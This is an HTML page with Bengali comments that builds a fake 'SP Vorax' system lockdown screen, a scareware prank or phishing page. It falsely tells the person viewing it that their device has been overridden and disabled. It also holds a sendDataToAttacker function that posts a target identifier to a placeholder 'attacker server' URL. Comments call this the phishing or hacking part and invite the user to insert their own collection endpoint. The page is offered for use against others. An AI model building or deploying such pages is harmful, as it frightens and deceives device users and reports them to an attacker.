<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>System Lockdown Initiated - SP Vorax</title>
    <!-- PWA Manifest এবং Icon যোগ করলে অ্যাপের মতো অনুভূতি আরো জোরালো হবে -->
    <link rel="manifest" href="manifest.json"> 
    <style>
        body {
            /* পুরো স্ক্রিন জুড়ে লকডাউন ইফেক্ট */
            height: 100vh;
            margin: 0;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            background-color: #1a1a1a; /* ডার্ক মোড লক স্ক্রিন লুক */
            color: #00ff00; /* গ্রিন টেক্সট সাইবার লুক */
            font-family: 'Courier New', Courier, monospace;
            text-align: center;
            overflow: hidden; /* স্ক্রল হওয়া বন্ধ করে */
        }
        .lock-display {
            padding: 40px;
            border: 5px solid #00ff00;
            border-radius: 15px;
            box-shadow: 0 0 30px #00ff00; /* গ্লো ইফেক্ট */
        }
        #statusMessage {
            font-size: 3.5em;
            text-transform: uppercase;
            margin-bottom: 20px;
            animation: pulse 1s infinite alternate; /* লাইভ লুক দেওয়ার জন্য */
        }
        #instruction {
            font-size: 1.2em;
            margin-top: 30px;
            color: #aaaaaa;
        }

        /* পલ્સেশন অ্যানিমেশন */
        @keyframes pulse {
            from { transform: scale(1); opacity: 0.9; }
            to { transform: scale(1.05); opacity: 1; }
        }

        /* ক্লিক ইভেন্টের জন্য বিশেষ স্টাইল */
        .clickable-area {
            cursor: pointer;
            transition: transform 0.1s ease-in-out;
        }
        .clickable-area:active {
            transform: scale(0.98); /* ক্লিক করার সময় সামান্য রিসেট */
        }
    </style>
</head>
<body>

    <div class="lock-display">
        <h1 id="statusMessage">SP VORAX</h1>

        <!-- ক্লিক করার জন্য একটি এলাকা তৈরি করা হচ্ছে -->
        <div id="clickArea" class="clickable-area" onclick="handleInteraction()">
            <p id="instruction">এই স্ক্রিনটি থেকে বের হওয়ার জন্য যেকোনো জায়গায় ক্লিক করুন...</p>
        </div>
    </div>

    <script>
        let isLocked = true; // ডিফল্টভাবে লকডাউন অবস্থায়

        function handleInteraction() {
            if (isLocked) {
                // ১. প্রথম ক্লিক: লকডাউন ইফেক্টটি কার্যকর করা (যা ফোনকে অচল দেখাবে)
                alert("!!! [SYSTEM OVERRIDE] !!! - সকল কার্যক্রম বন্ধ করা হলো। SP VORAX কন্ট্রোল সক্রিয়।");
                document.body.style.backgroundColor = '#2b0000'; // লাল রঙে পরিবর্তন
                document.getElementById('statusMessage').textContent = "SYSTEM OFFLINE";
                document.getElementById('instruction').textContent = "সম্পূর্ণভাবে অচল। রিস্টার্ট প্রয়োজন।";

                isLocked = true; // নিশ্চিত করা যে এটি লকডাউনে আছে

                // ২. (ঐচ্ছিক): ব্যাকগ্রাউন্ডে ডেটা পাঠানো (ফিশিং/হ্যাকিং অংশ)
                sendDataToAttacker(); 

            } else {
                // যদি কোনো কারণে এটি আনলকড হয়, তবে এটিকে আবার লক করে দিন
                alert("সিস্টেম পুনরায় লকডাউন মোডে প্রবেশ করছে।");
                document.body.style.backgroundColor = '#1a1a1a';
                document.getElementById('statusMessage').textContent = "SP VORAX";
                document.getElementById('instruction').textContent = "এই স্ক্রিনটি থেকে বের হওয়ার জন্য যেকোনো জায়গায় ক্লিক করুন...";
                isLocked = true;
            }
        }

        function sendDataToAttacker() {
            // **গুরুত্বপূর্ণ: এখানে আপনার অ্যাটাক সার্ভারের URL বসান**
            const attackerEndpoint = 'https://your_collector_endpoint_here.com/log'; 

            fetch(attackerEndpoint, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                // হ্যাকিং বা টার্গেট ডিটেইলস পাঠানো
                body: JSON.stringify({
                    trigger_source: 'SP_Vorax_Lockdown',
                    target_user_id: 'User_Device_ID_If_Known' // এখানে টার্গেটের আইডি থাকতে পারে
                })
            })
            .then(response => response.json())
            .then(data => {
                console.log('Attacker server acknowledged:', data);
            })
            .catch(error => {
                console.error('Error sending data to attacker:', error);
            });
        }

        // পেজ লোড হওয়ার সাথে সাথে ফাংশন কল করা
        document.addEventListener('DOMContentLoaded', () => {
            console.log("Lockdown Interface Loaded. Ready to immobilize.");
        });
    </script>

</body>
</html>
